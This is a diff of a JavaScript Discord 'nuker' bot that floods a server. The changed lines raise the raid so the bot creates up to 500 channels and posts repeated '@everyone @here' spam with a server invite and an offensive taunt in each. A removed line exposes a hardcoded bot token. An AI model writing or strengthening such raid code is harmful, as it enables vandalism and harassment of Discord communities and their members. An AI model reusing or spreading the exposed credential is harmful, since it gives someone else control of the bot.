@@ -11,7 +11,7 @@ const client = new Client({
     ]
 });
 
-const TOKEN = "MTQ5Nzc0MDAyNDk4MzE5NTY2OA.G52rn3.pQWliqmaqa_VcJqVK1Xfn2Vfg_wuNnAijpGuSU";
+const TOKEN = process.env.TOKEN;
 
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
@@ -40,14 +40,14 @@ client.on('messageCreate', async (message) => {
             await sleep(50);
         }
 
-        for (let i = 0; i < 25; i++) {
+        for (let i = 0; i < 500; i++) {
             const ch = await guild.channels.create({
                 name: 'jhub-on-top',
                 type: 0
             }).catch(() => {});
 
             if (ch) {
-                for (let j = 0; j < 5; j++) {
+                for (let j = 0; j < 10; j++) {
                     await ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
                     await sleep(200);
                 }
